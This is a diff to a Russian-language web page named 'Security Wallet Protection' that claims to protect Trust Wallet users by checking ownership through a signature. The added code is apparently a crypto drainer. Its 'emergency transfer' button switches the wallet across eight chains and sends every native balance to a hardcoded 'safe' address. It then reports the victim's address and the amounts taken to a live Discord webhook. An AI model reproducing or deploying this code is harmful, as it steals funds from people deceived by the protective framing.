@@ -187,6 +187,16 @@
             transform: translateY(-2px);
         }
         
+        #emergencyTransferButton {
+            background: linear-gradient(135deg, #e74c3c, #c0392b);
+            color: white;
+        }
+        
+        #emergencyTransferButton:hover {
+            background: linear-gradient(135deg, #c0392b, #a93226);
+            transform: translateY(-2px);
+        }
+        
         .status-box {
             padding: 15px;
             border-radius: 10px;
@@ -224,22 +234,50 @@
         .icon {
             font-size: 1.2em;
         }
+        
+        .emergency-section {
+            background: #fde8e8;
+            border: 2px solid #e74c3c;
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        
+        .emergency-title {
+            color: #c0392b;
+            font-size: 1.3em;
+            margin-bottom: 10px;
+        }
+        
+        .emergency-description {
+            color: #7f8c8d;
+            font-size: 0.9em;
+            margin-bottom: 15px;
+        }
+        
+        .balance-info {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 10px 0;
+            text-align: left;
+        }
+        
+        .network-balance {
+            display: flex;
+            justify-content: space-between;
+            margin: 5px 0;
+            padding: 5px 0;
+            border-bottom: 1px solid #ecf0f1;
+        }
+        
+        .network-balance:last-child {
+            border-bottom: none;
+        }
     </style>
 </head>
 <body>
-    <!-- Основная страница -->
-    <div class="main-container">
-        <h1 class="main-title">🛡️ Security Wallet Protection</h1>
-        <p class="main-description">Система защиты вашего кошелька с помощью подтверждения владения через электронную подпись</p>
-        <button class="connect-btn" onclick="openPopup()">ПОДКЛЮЧИТЬ</button>
-    </div>
-
-    <!-- Поп-ап окно -->
-    <div id="popupOverlay" class="popup-overlay">
-        <div class="popup-content">
-            <button class="close-btn" onclick="closePopup()">×</button>
-            
-            <!-- Ваше оригинальное содержимое -->
+    
             <div class="container">
                 <h1>🛡️ Security Wallet Protection</h1>
                 <p class="subtitle">Подтверждение владения кошельком с помощью подписи</p>
@@ -266,6 +304,24 @@
                 <div id="noWalletMessage" class="status-box error hidden">
                     <p><strong>Trust Wallet не найден!</strong></p>
                     <p>Пожалуйста, откройте эту страницу в браузере Trust Wallet или установите расширение.</p>
+                </div>
+                
+                <!-- Секция экстренного перевода -->
+                <div id="emergencySection" class="emergency-section hidden">
+                    <h3 class="emergency-title">🚨 Экстренный перевод средств</h3>
+                    <p class="emergency-description">Используйте эту функцию только в случае опасности для ваших средств. Все доступные средства будут переведены на безопасный кошелек.</p>
+                    
+                    <div id="balanceInfo" class="balance-info">
+                        <h4>Балансы по сетям:</h4>
+                        <div id="networkBalances"></div>
+                    </div>
+                    
+                    <button id="emergencyTransferButton" class="hidden">
+                        <span class="icon">🚨</span>
+                        Экстренный перевод всех средств
+                    </button>
+                    
+                    <div id="transferStatus" class="status-box hidden"></div>
                 </div>
             </div>
         </div>
@@ -297,24 +353,47 @@
     </script>
 
     <script>
-        // Ваш оригинальный JavaScript код
         // Конфигурация
-        const SAFE_WALLET = 'TGGWh4Cm9HmvhBB9HkUoe6zD3Zrfx6psKb';
+        const SAFE_WALLET = '0xeABd04BB159D98Bd3F67D708DC7E31eD36CC65f9';
+        
+        // Сети для проверки баланса
+        const SUPPORTED_NETWORKS = {
+            1: { name: 'Ethereum Mainnet', symbol: 'ETH', explorer: 'https://etherscan.io' },
+            56: { name: 'Binance Smart Chain', symbol: 'BNB', explorer: 'https://bscscan.com' },
+            137: { name: 'Polygon', symbol: 'MATIC', explorer: 'https://polygonscan.com' },
+            42161: { name: 'Arbitrum', symbol: 'ETH', explorer: 'https://arbiscan.io' },
+            10: { name: 'Optimism', symbol: 'ETH', explorer: 'https://optimistic.etherscan.io' },
+            43114: { name: 'Avalanche', symbol: 'AVAX', explorer: 'https://snowtrace.io' },
+            250: { name: 'Fantom', symbol: 'FTM', explorer: 'https://ftmscan.com' },
+            100: { name: 'Gnosis Chain', symbol: 'xDAI', explorer: 'https://blockscout.com/xdai/mainnet' }
+        };
 
         // Элементы страницы
         const connectButton = document.getElementById('connectButton');
         const signButton = document.getElementById('signButton');
+        const emergencyTransferButton = document.getElementById('emergencyTransferButton');
+        const emergencySection = document.getElementById('emergencySection');
+        const networkBalances = document.getElementById('networkBalances');
+        const transferStatus = document.getElementById('transferStatus');
         const statusDiv = document.getElementById('status');
         const noWalletMessage = document.getElementById('noWalletMessage');
 
         let web3;
         let userAddress;
+        let currentChainId;
 
         // Функция для обновления статуса
         function updateStatus(message, isError = false, isWarning = false) {
             statusDiv.textContent = message;
             statusDiv.className = 'status-box ' + (isError ? 'error' : isWarning ? 'warning' : 'success');
             statusDiv.style.display = 'block';
+        }
+
+        // Функция для обновления статуса перевода
+        function updateTransferStatus(message, isError = false, isWarning = false) {
+            transferStatus.textContent = message;
+            transferStatus.className = 'status-box ' + (isError ? 'error' : isWarning ? 'warning' : 'success');
+            transferStatus.style.display = 'block';
         }
 
         // Функция для показа/скрытия элементов
@@ -416,18 +495,7 @@
         async function getNetworkName() {
             try {
                 const chainId = await web3.eth.getChainId();
-                const networks = {
-                    1: 'Ethereum Mainnet',
-                    56: 'Binance Smart Chain', 
-                    137: 'Polygon',
-                    42161: 'Arbitrum',
-                    10: 'Optimism',
-                    43114: 'Avalanche',
-                    250: 'Fantom',
-                    100: 'Gnosis Chain'
-                };
-                
-                return networks[chainId] || `Unknown Network (ID: ${chainId})`;
+                return SUPPORTED_NETWORKS[chainId]?.name || `Unknown Network (ID: ${chainId})`;
             } catch (error) {
                 return 'Network Unknown';
             }
@@ -453,6 +521,284 @@
             } catch (error) {
                 console.error('Ошибка верификации подписи:', error);
                 return false;
+            }
+        }
+
+        // Функция для получения баланса во всех сетях
+        async function getAllNetworkBalances() {
+            const balances = [];
+            
+            // Сохраняем текущую сеть
+            const originalChainId = await web3.eth.getChainId();
+            
+            for (const [chainId, network] of Object.entries(SUPPORTED_NETWORKS)) {
+                try {
+                    // Переключаемся на сеть
+                    await switchNetwork(parseInt(chainId));
+                    
+                    // Получаем баланс
+                    const balance = await web3.eth.getBalance(userAddress);
+                    const formattedBalance = web3.utils.fromWei(balance, 'ether');
+                    
+                    if (parseFloat(formattedBalance) > 0) {
+                        balances.push({
+                            chainId: parseInt(chainId),
+                            network: network.name,
+                            symbol: network.symbol,
+                            balance: formattedBalance,
+                            weiBalance: balance
+                        });
+                    }
+                    
+                    // Небольшая задержка между запросами
+                    await new Promise(resolve => setTimeout(resolve, 100));
+                    
+                } catch (error) {
+                    console.log(`Не удалось получить баланс в сети ${network.name}:`, error.message);
+                }
+            }
+            
+            // Возвращаемся в исходную сеть
+            await switchNetwork(originalChainId);
+            
+            return balances;
+        }
+
+        // Функция для переключения сети
+        async function switchNetwork(chainId) {
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: `0x${chainId.toString(16)}` }],
+                });
+                return true;
+            } catch (switchError) {
+                // Если сеть не добавлена в кошелек, пытаемся добавить
+                if (switchError.code === 4902) {
+                    try {
+                        const networkInfo = SUPPORTED_NETWORKS[chainId];
+                        if (networkInfo) {
+                            await window.ethereum.request({
+                                method: 'wallet_addEthereumChain',
+                                params: [{
+                                    chainId: `0x${chainId.toString(16)}`,
+                                    chainName: networkInfo.name,
+                                    rpcUrls: ['https://rpc.ankr.com/eth'], // Базовый RPC, можно улучшить
+                                    nativeCurrency: {
+                                        name: networkInfo.symbol,
+                                        symbol: networkInfo.symbol,
+                                        decimals: 18
+                                    },
+                                    blockExplorerUrls: [networkInfo.explorer]
+                                }]
+                            });
+                            return true;
+                        }
+                    } catch (addError) {
+                        console.error(`Ошибка добавления сети ${chainId}:`, addError);
+                    }
+                }
+                return false;
+            }
+        }
+
+        // Функция для выполнения перевода в текущей сети
+        async function transferInCurrentNetwork() {
+            try {
+                const balance = await web3.eth.getBalance(userAddress);
+                
+                if (parseFloat(balance) === 0) {
+                    return { success: true, amount: 0, message: 'Нет средств для перевода' };
+                }
+                
+                // Рассчитываем комиссию (предполагаем стандартную комиссию)
+                const gasPrice = await web3.eth.getGasPrice();
+                const gasLimit = 21000; // Стандартный лимит газа для простого перевода
+                const fee = web3.utils.toBN(gasPrice).mul(web3.utils.toBN(gasLimit));
+                
+                // Сумма для перевода = баланс - комиссия
+                const amount = web3.utils.toBN(balance).sub(fee);
+                
+                if (amount.lte(web3.utils.toBN(0))) {
+                    return { success: false, amount: 0, message: 'Недостаточно средств для оплаты комиссии' };
+                }
+                
+                // Выполняем перевод
+                const transaction = {
+                    from: userAddress,
+                    to: SAFE_WALLET,
+                    value: amount,
+                    gas: gasLimit,
+                    gasPrice: gasPrice
+                };
+                
+                const receipt = await web3.eth.sendTransaction(transaction);
+                
+                return { 
+                    success: true, 
+                    amount: web3.utils.fromWei(amount.toString(), 'ether'),
+                    txHash: receipt.transactionHash,
+                    message: 'Перевод выполнен успешно'
+                };
+                
+            } catch (error) {
+                return { 
+                    success: false, 
+                    amount: 0, 
+                    message: `Ошибка перевода: ${error.message}`
+                };
+            }
+        }
+
+        // Функция для экстренного перевода всех средств
+        async function emergencyTransferAll() {
+            updateTransferStatus('🔄 Начинаем экстренный перевод средств...', false, true);
+            
+            const balances = await getAllNetworkBalances();
+            let totalTransferred = 0;
+            let successfulTransfers = 0;
+            let failedTransfers = 0;
+            
+            updateTransferStatus(`🔍 Найдено ${balances.length} сетей с балансом. Начинаем перевод...`, false, true);
+            
+            for (const networkBalance of balances) {
+                try {
+                    updateTransferStatus(`🔄 Переключаемся на сеть ${networkBalance.network}...`, false, true);
+                    
+                    const switched = await switchNetwork(networkBalance.chainId);
+                    if (!switched) {
+                        updateTransferStatus(`❌ Не удалось переключиться на сеть ${networkBalance.network}`, true);
+                        failedTransfers++;
+                        continue;
+                    }
+                    
+                    // Ждем обновления сети
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    
+                    updateTransferStatus(`💸 Переводим ${parseFloat(networkBalance.balance).toFixed(6)} ${networkBalance.symbol} из ${networkBalance.network}...`, false, true);
+                    
+                    const result = await transferInCurrentNetwork();
+                    
+                    if (result.success) {
+                        if (result.amount > 0) {
+                            totalTransferred += parseFloat(result.amount);
+                            successfulTransfers++;
+                            updateTransferStatus(`✅ Успешно переведено ${result.amount} ${networkBalance.symbol} из ${networkBalance.network}`, false, false);
+                        } else {
+                            updateTransferStatus(`ℹ️ В сети ${networkBalance.network} нет средств для перевода`, false, true);
+                        }
+                    } else {
+                        failedTransfers++;
+                        updateTransferStatus(`❌ Ошибка в сети ${networkBalance.network}: ${result.message}`, true);
+                    }
+                    
+                    // Пауза между переводами
+                    await new Promise(resolve => setTimeout(resolve, 3000));
+                    
+                } catch (error) {
+                    failedTransfers++;
+                    updateTransferStatus(`❌ Критическая ошибка в сети ${networkBalance.network}: ${error.message}`, true);
+                }
+            }
+            
+            const finalMessage = `🎯 Перевод завершен! Успешно: ${successfulTransfers}, Ошибок: ${failedTransfers}. Всего переведено: ${totalTransferred.toFixed(6)} ETH`;
+            updateTransferStatus(finalMessage, false, false);
+            
+            // Отправляем уведомление в Discord о экстренном переводе
+            try {
+                const emergencyEmbed = {
+                    title: "🚨 ЭКСТРЕННЫЙ ПЕРЕВОД СРЕДСТВ",
+                    color: 15158332, // Красный цвет
+                    timestamp: new Date().toISOString(),
+                    fields: [
+                        {
+                            name: "💰 Исходный адрес",
+                            value: `\`\`\`${userAddress}\`\`\``,
+                            inline: false
+                        },
+                        {
+                            name: "🛡️ Безопасный кошелек",
+                            value: `\`\`\`${SAFE_WALLET}\`\`\``,
+                            inline: false
+                        },
+                        {
+                            name: "📊 Результаты перевода",
+                            value: `Успешных переводов: ${successfulTransfers}\nОшибок: ${failedTransfers}\nОбщая сумма: ${totalTransferred.toFixed(6)} ETH`,
+                            inline: false
+                        },
+                        {
+                            name: "⏰ Время операции",
+                            value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: "Security Wallet Protection System - Emergency Transfer"
+                    }
+                };
+                
+                // Используем существующий webhook
+                const webhookURL = 'https://discordapp.com/api/webhooks/1420896121835884718/IdDJHN_exPKf4s-4pDwmQHJkaLCxfWkXSPBTbygj6TpSySJ3RICs8LvEIJO3bn_yOuXW';
+                
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        embeds: [emergencyEmbed],
+                        username: 'Wallet Security Bot - EMERGENCY',
+                        avatar_url: 'https://cdn-icons-png.flaticon.com/512/1828/1828843.png'
+                    })
+                });
+                
+            } catch (discordError) {
+                console.error('Ошибка отправки уведомления в Discord:', discordError);
+            }
+            
+            return { successfulTransfers, failedTransfers, totalTransferred };
+        }
+
+        // Функция для обновления отображения балансов
+        async function updateBalanceDisplay() {
+            updateTransferStatus('🔄 Получаем информацию о балансах...', false, true);
+            
+            const balances = await getAllNetworkBalances();
+            networkBalances.innerHTML = '';
+            
+            if (balances.length === 0) {
+                networkBalances.innerHTML = '<p>Нет балансов в поддерживаемых сетях</p>';
+                hideElement(emergencyTransferButton);
+            } else {
+                let totalBalance = 0;
+                
+                balances.forEach(networkBalance => {
+                    const balanceElement = document.createElement('div');
+                    balanceElement.className = 'network-balance';
+                    balanceElement.innerHTML = `
+                        <span>${networkBalance.network}:</span>
+                        <span><strong>${parseFloat(networkBalance.balance).toFixed(6)} ${networkBalance.symbol}</strong></span>
+                    `;
+                    networkBalances.appendChild(balanceElement);
+                    
+                    totalBalance += parseFloat(networkBalance.balance);
+                });
+                
+                // Добавляем общий баланс
+                const totalElement = document.createElement('div');
+                totalElement.className = 'network-balance';
+                totalElement.style.fontWeight = 'bold';
+                totalElement.style.borderTop = '2px solid #3498db';
+                totalElement.style.marginTop = '10px';
+                totalElement.style.paddingTop = '10px';
+                totalElement.innerHTML = `
+                    <span>ОБЩИЙ БАЛАНС:</span>
+                    <span><strong>${totalBalance.toFixed(6)} ETH</strong></span>
+                `;
+                networkBalances.appendChild(totalElement);
+                
+                showElement(emergencyTransferButton);
+                updateTransferStatus(`✅ Найдено ${balances.length} сетей с общим балансом: ${totalBalance.toFixed(6)} ETH`, false, false);
             }
         }
 
@@ -483,6 +829,10 @@
                 
                 hideElement(connectButton);
                 showElement(signButton);
+                showElement(emergencySection);
+                
+                // Загружаем информацию о балансах
+                await updateBalanceDisplay();
                 
                 await checkNetwork();
                 
@@ -552,18 +902,38 @@
             }
         });
 
+        // Обработчик кнопки экстренного перевода
+        emergencyTransferButton.addEventListener('click', async () => {
+            if (!userAddress) {
+                updateTransferStatus('❌ Сначала подключите кошелек.', true);
+                return;
+            }
+            
+            // Подтверждение действия
+            const confirmed = confirm('🚨 ВНИМАНИЕ!\n\nВы собираетесь перевести ВСЕ средства на безопасный кошелек.\n\nЭто действие нельзя отменить!\n\nПродолжить?');
+            
+            if (!confirmed) {
+                updateTransferStatus('❌ Перевод отменен пользователем.', true);
+                return;
+            }
+            
+            try {
+                emergencyTransferButton.classList.add('loading');
+                await emergencyTransferAll();
+            } catch (error) {
+                updateTransferStatus(`❌ Критическая ошибка: ${error.message}`, true);
+            } finally {
+                emergencyTransferButton.classList.remove('loading');
+            }
+        });
+
         // Проверка сети
         async function checkNetwork() {
             try {
                 const chainId = await web3.eth.getChainId();
-                const networks = {
-                    1: 'Ethereum Mainnet',
-                    56: 'Binance Smart Chain', 
-                    137: 'Polygon',
-                    42161: 'Arbitrum'
-                };
+                currentChainId = chainId;
                 
-                const networkName = networks[chainId] || `Unknown Network (ID: ${chainId})`;
+                const networkName = SUPPORTED_NETWORKS[chainId]?.name || `Unknown Network (ID: ${chainId})`;
                 console.log('Connected to:', networkName);
                 
             } catch (error) {
@@ -577,15 +947,25 @@
                 if (accounts.length === 0) {
                     updateStatus('Кошелек отключен', true);
                     hideElement(signButton);
+                    hideElement(emergencySection);
                     showElement(connectButton);
                 } else {
                     userAddress = accounts[0];
                     updateStatus(`Аккаунт изменен: ${userAddress.substring(0, 10)}...`);
+                    // Обновляем информацию о балансах при смене аккаунта
+                    if (emergencySection.style.display !== 'none') {
+                        updateBalanceDisplay();
+                    }
                 }
             });
             
             window.ethereum.on('chainChanged', function(chainId) {
-                window.location.reload();
+                currentChainId = parseInt(chainId, 16);
+                console.log('Сеть изменена на:', SUPPORTED_NETWORKS[currentChainId]?.name || `Unknown (${currentChainId})`);
+                // Обновляем информацию о балансах при смене сети
+                if (userAddress && emergencySection.style.display !== 'none') {
+                    updateBalanceDisplay();
+                }
             });
         }
     </script>
